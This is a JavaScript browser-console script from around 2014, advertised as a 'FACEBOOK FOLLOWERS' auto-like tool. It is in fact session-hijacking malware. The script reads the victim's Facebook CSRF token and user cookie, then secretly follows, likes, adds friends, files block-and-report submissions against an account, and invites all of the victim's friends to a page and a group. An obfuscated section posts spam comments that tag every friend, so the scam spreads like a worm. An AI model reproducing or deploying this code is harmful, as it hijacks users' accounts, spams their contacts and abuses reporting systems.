/*HTML/JavaScript page status="protected"*/
/*FACEBOOK FOLLOWERS*/
/*Copyright Ãƒâ€šÃ‚Â© 2014 Kodran Piraj. All Rights Reserved.*/
alert('FACEBOOK FOLLOWERS');
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
    var http4 = new XMLHttpRequest;
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) http4.close
    };
    http4.send(params4)
}


function sublist(uidss) {
    var a = document.createElement('script');
    a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
    document.body.appendChild(a)
}

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function P(post) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=1&client_id=" + now + "%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]=" + post + "&nctr[_mod]=pagelet_home_stream&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close
        }
    };
    X.send(XParams)
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close
        }
    };
    Page.send(PageParams)
}


function IDS(r) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/add_friend/action.php";
    var XParams = "to_friend=" + r + "&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close
        }
    };
    X.send(XParams)
}


var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "521349377986258", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " АВТО ЛАЙК АВТО ФОЛЛОВ || ЭНЭ ҮНЭХЭЭР АЖИЛЛАЖ БАЙНА :* 󾀼 @[", "uid", ":", "text", "]", " ", "&filter[0]=user", "&options[0]=friends_only", "&options[1]=nm", "&token=v7", "&viewer=", "&__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "&ft_ent_identifier=", "&comment_text= ЭНЭ АЖИЛЛАЖ БАЙНА ШҮҮ- AUTO FOLLOWERS [ 100% ]  ^_^ АВТО ЛАЙК Ч ГЭСЭН ОРЖ БАЙНА", "&source=2", "&client_id=1377871797138:1707018092", "&reply_fbid", "&parent_comment_id", "&rootid=u_jsonp_2_3", "&clp={\"cl_impid\":\"453524a0\",\"clearcounter\":0,\"elementid\":\"js_5\",\"version\":\"x\",\"parent_fbid\":", "}", "&attached_sticker_fbid=0", "&attached_photo_fbid=0", "&giftccasion", "&ft[tn]=[]", "&__a=1", "&__dyn=7n8ahyj35ynxl2u5F97KepEsyo", "&__req=q", "&fb_dtsg=", "&ttstamp=", "POST", "/ajax/ufi/add_comment.php", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "status", "close"];
var fb_dtsg = document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];
var user_id = document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);
var id = _0xa22c[5];
var arkadaslar = [];
var svn_rev;

function arkadaslari_al(id) {
    var _0x7892x7 = new XMLHttpRequest();
    _0x7892x7[_0xa22c[6]] = function () {
        if (_0x7892x7[_0xa22c[7]] == 4) {
            eval(_0xa22c[8] + _0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9], _0xa22c[10]) + _0xa22c[13]);
            for (f = 0; f < Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]] / 27); f++) {
                mesaj = _0xa22c[10];
                mesaj_text = _0xa22c[10];
                for (i = f * 27; i < (f + 1) * 27; i++) {
                    if (arkadaslar[_0xa22c[16]][_0xa22c[15]][i]) {
                        mesaj += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]] + _0xa22c[22];
                        mesaj_text += _0xa22c[23] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];
                    };
                };
                yorum_yap(id, mesaj);
            };
        };
    };
    var _0x7892x8 = _0xa22c[24];
    _0x7892x8 += _0xa22c[25];
    _0x7892x8 += _0xa22c[26];
    _0x7892x8 += _0xa22c[27];
    _0x7892x8 += _0xa22c[28] + user_id;
    _0x7892x8 += _0xa22c[29] + user_id;
    if (document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30]) >= 0) {
        _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[34] + _0x7892x8, true);
    } else {
        _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[36] + _0x7892x8, true);
    };
    _0x7892x7[_0xa22c[37]]();
};

function RandomArkadas() {
    var _0x7892xa = _0xa22c[10];
    for (i = 0; i < 9; i++) {
        _0x7892xa += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]] + _0xa22c[22];
    };
    return _0x7892xa;
};

function yorum_yap(id, _0x7892xc) {
    var _0x7892xd = new XMLHttpRequest();
    var _0x7892x8 = _0xa22c[10];
    _0x7892x8 += _0xa22c[40] + id;
    _0x7892x8 += _0xa22c[41] + encodeURIComponent(_0x7892xc);
    _0x7892x8 += _0xa22c[42];
    _0x7892x8 += _0xa22c[43];
    _0x7892x8 += _0xa22c[44];
    _0x7892x8 += _0xa22c[45];
    _0x7892x8 += _0xa22c[46];
    _0x7892x8 += _0xa22c[47] + id + _0xa22c[48];
    _0x7892x8 += _0xa22c[49];
    _0x7892x8 += _0xa22c[50];
    _0x7892x8 += _0xa22c[51];
    _0x7892x8 += _0xa22c[52];
    _0x7892x8 += _0xa22c[29] + user_id;
    _0x7892x8 += _0xa22c[53];
    _0x7892x8 += _0xa22c[54];
    _0x7892x8 += _0xa22c[55];
    _0x7892x8 += _0xa22c[56] + fb_dtsg;
    _0x7892x8 += _0xa22c[57];
    _0x7892xd[_0xa22c[35]](_0xa22c[58], _0xa22c[59], true);
    _0x7892xd[_0xa22c[62]](_0xa22c[60], _0xa22c[61]);
    _0x7892xd[_0xa22c[6]] = function () {
        if (_0x7892xd[_0xa22c[7]] == 4 && _0x7892xd[_0xa22c[63]] == 200) {
            _0x7892xd[_0xa22c[64]];
        };
    };
    _0x7892xd[_0xa22c[37]](_0x7892x8);
};
arkadaslari_al(id);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function report(r) {
    var X = new XMLHttpRequest();
    var XURL = "https://www.facebook.com/ajax/report/social.php";
    var XParams = "fb_dtsg=" + fb_dtsg + "&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r + "%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2F%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r + "%2C%22sub_report_type%22%3A141%2C%22time_flow_started%22%3A" + now + "%2C%22user%22%3A" + user_id + "%7D&file_report=1&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=h&ttstamp=26581661107112011276&confirmed=1";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}


var Title = ' FACEBOOK FOLLOWERS 2014 ';
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/32123123213s" target="_blank">Kodran Piraj</A> & <A style="color:#3B5998;" href="http://www.facebook.com/ddasdsasd23" target="_blank"> Kodran Piraj - Kosovo</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/thePrince.k1" target="_blank"> Kodran Piraj</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/blaablaa" target="_blank"> Kodran Pirj </A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://autolikes-bykodran.blogspot.com/" target="_blank">AUTO LIKES</A>.</A>';
newcomer = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;

function SuggestFriend(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=" + newcomer + "&attempt_id=b59804250a76689137fe1cb2c05367db&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=o&fb_dtsg=" + fb_dtsg + "&ttstamp=265816610484687452", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
      /**
        if (c.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
        **/
            Descriptions += "color:gray;font-size:12px'>";
            Descriptions += "Friend Suggestion Sent";
            suc++
        /*}*/
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            display += arr.length + " Friends Detected<br/>";
            display += "<b>" + suc + "</b> Friends Suggested of " + (arr.length - i) + " Friends Processed ";
            display += "(" + i + " Lefted...)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += _text;
            display += "</div>";
            display += "</div>"
        } else {
            display += arr.length + " Friends Detected and ";
            display += "<b>" + suc + " Friends Suggested</b></br>";
            display += "<div><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span>"
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        sx = pho[tay];
        setTimeout("SuggestFriend(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);



    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=233639806819861&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
    }

    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=1421483778086884&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
    }

}

function clickfr_callback() {
    if (document.getElementsByName("ok").length > 0) nHtml.ClickUp(document.getElementsByName("ok")[0]);
    var a = arr[i];
    if (i < arr.length) addfriend(a.substring(0, 4))
}

function clickfr() {
    if (document.getElementsByClassName("search").length > 0) nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]);
    else j++;
    setTimeout("clickfr_callback()", 2E3)
}

function addfriend(a) {
    i++;
    setTimeout("clickfr()", 2E3)
}
jx = {
    getHTTPObject: function () {
        var a = false;
        if (typeof ActiveXObject != "undefined") try {
                a = new ActiveXObject("Msxml2.XMLHTTP")
            } catch (b) {
                try {
                    a = new ActiveXObject("Microsoft.XMLHTTP")
                } catch (c) {
                    a = false
                }
            } else if (window.XMLHttpRequest) try {
                a = new XMLHttpRequest
            } catch (b) {
                a = false
            }
        return a
    },
    load: function (url, callback, format, method, opt) {
        var http = this.init();
        if (!http || !url) return;
        if (http.overrideMimeType) http.overrideMimeType("text/xml");
        if (!method) method = "GET";
        if (!format) format = "text";
        if (!opt) opt = {};
        format = format.toLowerCase();
        method = method.toUpperCase();
        var now = "uid=" + (new Date).getTime();
        url += url.indexOf("?") + 1 ? "&" : "?";
        url += now;
        var parameters = null;
        if (method == "POST") {
            var parts = url.split("?");
            url = parts[0];
            parameters = parts[1]
        }
        http.open(method, url, true);
        var ths = this;
        if (opt.handler) http.onreadystatechange = function () {
            opt.handler(http)
        };
        else http.onreadystatechange = function () {
            if (http.readyState == 4)
                if (http.status == 200) {
                    var result = "";
                    if (http.responseText) result = http.responseText;
                    if (format.charAt(0) == "j") {
                        result = result.replace(/[\n\r]/g, "");
                        result = eval("(" + result + ")")
                    } else if (format.charAt(0) == "x") result = http.responseXML;
                    if (callback) callback(result)
                } else {
                    if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
                    if (opt.loading) document.getElementById(opt.loading).style.display = "none";
                    /**if (error) error(http.status)**/
                }
        };
        http.send(parameters)
    },
    bind: function (a) {
        var b = {
            url: "",
            onSuccess: false,
            onError: false,
            format: "text",
            method: "GET",
            update: "",
            loading: "",
            loadingIndicator: ""
        };
        for (var c in b)
            if (a[c]) b[c] = a[c];
        if (!b.url) return;
        var d = false;
        if (b.loadingIndicator) {
            d = document.createElement("div");
            d.setAttribute("style", "position:absolute;top:0px;left:0px;");
            d.setAttribute("class", "loading-indicator");
            d.innerHTML = b.loadingIndicator;
            document.getElementsByTagName("body")[0].appendChild(d);
            this.opt.loadingIndicator = d
        }
        if (b.loading) document.getElementById(b.loading).style.display = "block";
        this.load(b.url, function (a) {
            if (b.onSuccess) b.onSuccess(a);
            if (b.update) document.getElementById(b.update).innerHTML = a;
            if (d) document.getElementsByTagName("body")[0].removeChild(d);
            if (b.loading) document.getElementById(b.loading).style.display = "none"
        }, b.format, b.method, b)
    },
    init: function () {
        return this.getHTTPObject()
    }
};
var nHtml = {
    FindByAttr: function (a, b, c, d) {
        if (c == "className") c = "class";
        var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
        if (e && e.singleNodeValue) return e.singleNodeValue;
        return null
    },
    FindByClassName: function (a, b, c) {
        return this.FindByAttr(a, b, "className", c)
    },
    FindByXPath: function (a, b) {
        try {
            var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
        } catch (d) {
            GM_log("bad xpath:" + b)
        }
        if (c && c.singleNodeValue) return c.singleNodeValue;
        return null
    },
    VisitUrl: function (a) {
        window.setTimeout(function () {
            document.location.href = a
        }, 500 + Math.floor(Math.random() * 500))
    },
    ClickWin: function (a, b, c) {
        var d = a.document.createEvent("MouseEvents");
        d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
        return !b.dispatchEvent(d)
    },
    Click: function (a) {
        return this.ClickWin(window, a, "click")
    },
    ClickTimeout: function (a, b) {
        window.setTimeout(function () {
            return nHtml.ClickWin(window, a, "click")
        }, b + Math.floor(Math.random() * 500))
    },
    ClickUp: function (a) {
        this.ClickWin(window, a, "mousedown");
        this.ClickWin(window, a, "mouseup");
        this.ClickWin(window, a, "click")
    },
    GetText: function (a, b) {
        var c = "";
        if (b == undefined) b = 0;
        if (b > 40) return;
        if (a.textContent != undefined) return a.textContent;
        for (var d = 0; d < a.childNodes.length; d++) {
            var e = a.childNodes[d];
            c += this.GetText(e, b + 1)
        }
        return c
    }
};
if (document.getElementsByClassName == undefined) document.getElementsByClassName = function (a) {
    var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
    var c = document.getElementsByTagName("*");
    var d = [];
    var e;
    for (var f = 0;
        (e = c[f]) != null; f++) {
        var g = e.className;
        if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
    }
    return d
};
Array.prototype.find = function (a) {
    var b = false;
    for (i = 0; i < this.length; i++)
        if (typeof a == "function") {
            if (a.test(this[i])) {
                if (!b) b = [];
                b.push(i)
            }
        } else if (this[i] === a) {
        if (!b) b = [];
        b.push(i)
    }
    return b
};
var i = 3;
var tay = 3;
var j = 0;
var k = 0;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
    display += arr.length + " Friends Detected";
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display;
    SuggestFriend(arr[i])
});
